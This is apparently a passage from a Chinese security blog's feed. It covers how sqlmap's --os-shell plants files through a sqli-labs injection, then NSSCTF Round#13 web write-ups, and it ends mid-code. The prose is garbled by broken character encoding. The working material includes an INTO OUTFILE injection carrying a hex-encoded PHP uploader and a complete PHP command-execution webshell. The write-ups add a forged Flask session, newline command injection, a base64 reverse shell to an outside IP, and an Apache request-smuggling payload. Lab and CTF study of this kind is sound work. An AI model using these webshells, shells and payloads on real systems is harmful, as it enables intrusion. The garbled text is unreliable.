        <content type="html"><![CDATA[<h2 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h2><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯æœ¬åœ°æ­å»ºçš„sqllabé¶åœºï¼Œæ­å»ºè¿™ä¸ªé¶åœºå¦‚æœé‡åˆ°æ•°æ®åº“åŠ è½½ä¸æˆåŠŸå¤§æ¦‚ç‡åŸå› ä¸ºphpç‰ˆæœ¬é—®é¢˜ï¼Œphpç‰ˆæœ¬å¿…é¡»ä¸º5.xå› ä¸º7ä»¥ä¸Šä¸æ”¯æŒ<code>mysql_connect</code>å‡½æ•°ç”¨çš„æ˜¯<code>mysqli_connect</code></p><h2 id="å¼€å§‹æ³¨å…¥"><a href="#å¼€å§‹æ³¨å…¥" class="headerlink" title="å¼€å§‹æ³¨å…¥"></a>å¼€å§‹æ³¨å…¥</h2><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹<code>--os-shell</code>ä¸€ç›´å†™ä¸è¿›å»é©¬ï¼Œè¿˜ä»¥ä¸ºæ˜¯æˆ‘è·¯å¾„çš„é—®é¢˜ï¼Œåé¢å‘ç°æ˜¯<code>secure_file_priv=</code>å¿…é¡»ä¸ºç©ºè¿™ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œphpstudyæ•°æ®åº“é‡Œé¢æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥åŠ ä¸Šå°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048382.png" alt="image-20230616204823343"><br>å¼€å§‹sqlæ³¨å…¥ï¼Œå…ˆæŠ“å–ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç„¶åå…³é—­æ‹¦æˆªï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥åœ¨burpä¸ŠæŠ“å–åˆ°æ‰€æœ‰çš„æ•°æ®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.102/sqli-labs-master/Less-1/?id=1&quot; --os-shell --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048866.png" alt="image-20230616204835828"><br>å…·ä½“å‚æ•°é€‰æ‹©å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048412.png" alt="image-20230616204846342"><br>æ‹¿åˆ°shell</p><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>æˆ‘ä»¬ä»ä¸‹é¢æ•°æ®åŒ…å¼€å§‹åˆ†æï¼Œå‰é¢çš„éƒ½æ˜¯æ­£å¸¸æ³¨å…¥çš„è¿‡ç¨‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048240.png" alt="image-20230616204857182"><br>è¿™é‡Œgetæ–¹å¼ä¼ å…¥äº†ä¸€å¤§å †urlç¼–ç çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041%27%20OR%209362%3D9362%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27D%3A%2Fphpstudy_pro%2FWWW%2Fsqli-labs-master%2FLess-1%2Ftmpuqmdh.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-</span><br></pre></td></tr></table></figure><p>è§£ç ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041&#x27; OR 9362=9362 LIMIT 0,1 INTO OUTFILE &#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -</span><br></pre></td></tr></table></figure><p>å‰é¢ä¸€æ¡æ˜¯æ­£å¸¸çš„sqlè¯­å¥ï¼Œåé¢æ˜¯åå…­è¿›åˆ¶æ•°æ®ï¼ŒæŠŠè¿™ä¸ªå†è§£ç ä¸€ä¸‹,è§£å‡ºæ¥æ˜¯phpä»£ç ï¼Œæ•´ç†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>() &lt; <span class="string">&#x27;4.1.0&#x27;</span>) &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>, <span class="number">0755</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] . <span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;  </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹å‰é¢çš„sqlè¯­å¥å«ä¹‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;Y0n3er&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥å…¶å®å°±æ˜¯åœ¨æŒ‡å®šè·¯å¾„ä¸‹å†™å…¥Y0n3erï¼Œ<code>LINES TERMINATED BY</code>å‚æ•°ç”¨äºæŒ‡å®šå°†å¼•å·å†…çš„å†…å®¹ä½œä¸ºç»ˆæ­¢ç¬¦ï¼Œä½†æ˜¯è¿™æ ·å¯ä»¥å°†æŒ‡å®šçš„å†…å®¹å†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/test.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;Y0n3er&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049896.png" alt="image-20230616204911858"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049822.png" alt="image-20230616204920783"><br>æˆåŠŸå†™å…¥è¿›å»ï¼Œç»“åˆä¸Šé¢çš„ä»£ç åˆ†æï¼Œå…¶å®è¿™ä¸ªå‘½ä»¤å°±æ˜¯å†™ä¸€ä¸ªç”¨äºæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•<code>tmpuqmdh.php</code>æ–‡ä»¶ï¼Œç»§ç»­åˆ†æï¼Œæ‰¾åˆ°äº†35è¿™ä¸ªæ•°æ®åŒ…ï¼Œé‡Œé¢é€šè¿‡postè®¿é—®ä¸Šä¼ äº†ä¸€ä¸ª<code>tmpbkdyk.php</code>æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049628.png" alt="image-20230616204929561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];  </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="number">0</span>);  </span><br><span class="line"><span class="variable">$z</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="keyword">array</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), <span class="variable">$t</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;  </span><br><span class="line">        <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>], <span class="number">512</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, r);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">            <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>, <span class="number">512</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">array</span>();  </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$w</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$w</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¤§æ¦‚å°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç„¶åè¾“å‡ºç»“æœï¼Œè‡³æ­¤æ•´ä¸ªè¿‡ç¨‹å°±å·®ä¸å¤šç»“æŸäº†ï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹å­˜åœ¨å‡ ä¸ªåé—¨æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•ä»£ç ï¼Œåº”è¯¥æ˜¯æˆ‘å¤šæ‰§è¡Œäº†ä¸€æ¬¡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049508.png" alt="image-20230616204942475"></p><h2 id="é™åˆ¶æ¡ä»¶"><a href="#é™åˆ¶æ¡ä»¶" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸‰ä¸ªæ¡ä»¶ï¼š</span><br><span class="line">1.å…·æœ‰rootæƒé™ã€‚</span><br><span class="line">2.åœ¨æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­çš„ é…ç½®é¡¹å«æœ‰ï¼šsecure_file_priv=&#x27;&#x27;ã€‚ï¼ˆæ³¨æ„åœ¨æ•°æ®åº“ä¸­æ­¤é¡¹é»˜è®¤ä¸ºsecure_file_priv=nullï¼‰ã€‚</span><br><span class="line">3.çŸ¥é“æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯é‚£ä¸ªå†™å…¥æ¡ä»¶ï¼Œå¦å¤–phpä¸»åŠ¨è½¬ä¹‰å¾—å…³é—­ï¼ŒGPCä¸ºoffï¼Œä½†æ˜¯GPCè¿™ä¸ªåœ¨åé¢çš„phpç‰ˆæœ¬éƒ½åˆ é™¤äº†ç”¨æˆ·å¯ä»¥è‡ªå·±æ§åˆ¶ï¼Œå³<code>magic_quotes_gpc</code>è¿™ä¸ªé€‰é¡¹ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸Šé¢ä¸‰ä¸ªæ¡ä»¶</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ†æä¸€éå‘ç°åŸç†ä¸æ˜¯å¾ˆéš¾ï¼Œ ä½†æ˜¯è¿™ä¸ªåˆ©ç”¨èµ·æ¥å¾ˆéš¾ï¼Œè¦æ±‚å¤ªé«˜äº†</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">sqlmap â€“os-shell åŸç†è¯¦è§£_osâ€“shell_ZredamanJçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#13 Web</title>
      <link href="/undefined/28258.html"/>
      <url>/undefined/28258.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ç‚¹æ„Ÿå¹"><a href="#ä¸€ç‚¹æ„Ÿå¹" class="headerlink" title="ä¸€ç‚¹æ„Ÿå¹"></a>ä¸€ç‚¹æ„Ÿå¹</h2><p>æœ€è¿‘å¾ˆçƒ¦ï¼Œæ¯”èµ›å¾ˆç®€å•çš„é¢˜ä¹Ÿåšä¸å‡ºæ¥å¤©å¤©çˆ†0ï¼Œä¼°è®¡æ˜¯åŸºç¡€æ²¡æ‰“ç‰¢å§ï¼Œé‡æ–°å›å»åˆ·åŸºç¡€é¢˜</p><h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>æ³¨å†Œè´¦å·å‘ç°adminå·²ç»å­˜åœ¨ï¼Œç„¶åéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·å‘ç°adminæ‰èƒ½getFlagï¼Œå°±æ˜¯ä¼ªé€ sessionäº†<br>åœ¨å¿˜è®°å¯†ç å‘é€é‚®ä»¶é‚£é‡ŒæŠ“åŒ…æ‰¾åˆ°key<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042149273.png" alt="image-20230604214829222"><br>ç„¶åå°±æ˜¯ä¼ªé€ sessionäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s th3f1askisfunny -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s th3f1askisfunny -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ªsessionå»getFlagå³å¯</p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>ç‚¹å‡»Toolå‘ç°å°†114514åˆ†è§£äº†ï¼Œä½¿ç”¨<code>%0a</code>æˆªæ–­å°†å‰é¢çš„å‘½ä»¤æˆªæ–­åé¢æ‹¼æ¥è¦æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0acat%20%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>/</code>ä¹Ÿè¦è¿›è¡Œurlç¼–ç ï¼Œä¸ç„¶ä¼šè¢«å½“åšæ–‡ä»¶ç›®å½•ï¼Œæ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯<code>cat /flag</code>å‡ºç°ä¸€å †æ•°å­—è¯»å‡ºæ¥ä¸å¥½è¯»ç›´æ¥åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0aecho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDMuOTkuMTYwLzY2NjYgMD4mMQ==|base64 -d|bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150726.png" alt="image-20230604215000673"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æŠ“ä¸ªåŒ…å‘ç°æœ‰ä¸ªApache&#x2F;2.4.55webæœåŠ¡å™¨ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰ä¸ªCVEï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/12345#toc-7">CVE-2023-25690 Apache HTTP Server è¯·æ±‚èµ°ç§æ¼æ´ åˆ†æä¸åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a><br>ç„¶åæˆ‘ä»¬è¯»å–index.phpå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¯»å–<code>/usr/local/apache2/conf/httpd.conf</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150738.png" alt="image-20230604215016705"><br>è¿™é‡Œå¯¹<code>/nssctf/</code>åšäº†ä¸ªä»£ç†è½¬å‘ï¼ŒçŒœæµ‹åœ¨è½¬å‘åçš„æœºå™¨ä¸Šï¼Œåˆ©ç”¨crlfæ¼æ´å»è¯»å–flagï¼Œè¿™ä¸ªpayloadç›¸å½“äºå»è¯·æ±‚è½¬å‘åçš„æœºå™¨ä¸Šçš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/0%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150023.png" alt="image-20230604215035976"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 